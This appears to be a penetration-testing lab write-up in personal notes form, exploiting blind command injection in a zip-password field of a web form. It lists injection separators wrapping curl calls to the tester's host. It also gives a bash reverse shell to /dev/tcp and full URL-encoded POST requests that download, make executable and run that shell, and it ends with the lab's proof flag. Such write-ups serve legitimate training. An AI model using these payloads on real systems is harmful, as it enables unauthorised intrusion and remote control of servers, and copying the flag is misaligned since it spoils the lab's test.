
#### Initial identification of vulnerable fields.
After reaching `local.txt` flag you are presented with this field, when you check the `Password Protect this Zip File` a new field is provided named `Password`
![[Pasted image 20241111194813.png]]

when submitting `test` in all the fields the `Burpsuite` request looks like this:
![[Pasted image 20241111194949.png]]
we can see the 3 fields `submissionData`, `passCheck`, and `zipPass`

---------

#### Command Injection
we then begin testing to see if `Command injection` is a vector, however utilizing a basic payload didnt work.
```bash
curl http://192.168.45.222:8000/test.txt
```
submitted in the password field
![[Pasted image 20241111195645.png]]
`200` error but nothing happened in my `python3` listener
![[Pasted image 20241111195718.png]]
going down the list below of [[11.2 - 11.2.4 Dealing with Common Protections]] weend up getting the `$` one to work.
`$(curl http://192.168.45.222:8000/test.txt)`
```bash
||curl http://192.168.45.222:8000/test.txt
;curl http://192.168.45.222:8000/test.txt
|curl http://192.168.45.222:8000/test.txt
&&curl http://192.168.45.222:8000/test.txt
`curl http://192.168.45.222:8000/test.txt`
$(curl http://192.168.45.222:8000/test.txt)
```
So the `Common Protections` worked
![[Pasted image 20241111195849.png]]
now since we know we are able to get `Blind Command Injection` lets try to get a reverse shell.


revshell creation:
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[11Nov2024 22:17:11]-[/home/kali/SUT/OSWA]
â””â”€# cat revshell        
bash -i >& /dev/tcp/192.168.45.222/4444 0>&1

```
utilizing the vulnerable parameter to upload `revshell` - make sure to `CTRL+U` to encode 
```bash
$(curl -o /tmp/revshell http://192.168.45.222:8000/revshell)
```
full payload with URL encoding:
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 132
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=%24%28curl+-o+%2Ftmp%2Frevshell+http%3A%2F%2F192.168.45.222%3A8000%2Frevshell%29
```
![[Pasted image 20241111200257.png]]
showing that the `revshell` was succesfully pulled over 
![[Pasted image 20241111201330.png]]
changing permissions to `executable`
```bash
$(chmod +x /tmp/revshell)
```
full payload with URL encoding:
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 89
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=%24%28chmod+%2Bx+%2Ftmp%2Frevshell%29
```
![[Pasted image 20241111201254.png]]
setting up a `nc` listener to catch a reverse shell
![[Pasted image 20241111201508.png]]
executing reverse shell
```bash
$(/bin/bash /tmp/revshell)
```
Full encoded payload:
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 92
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=%24%28%2Fbin%2Fbash+%2Ftmp%2Frevshell%29
```
![[Pasted image 20241111201611.png]]

#### Proof.txt 
`e83e084c2bcb87c9b64480858edd7f75`
![[Pasted image 20241111201727.png]]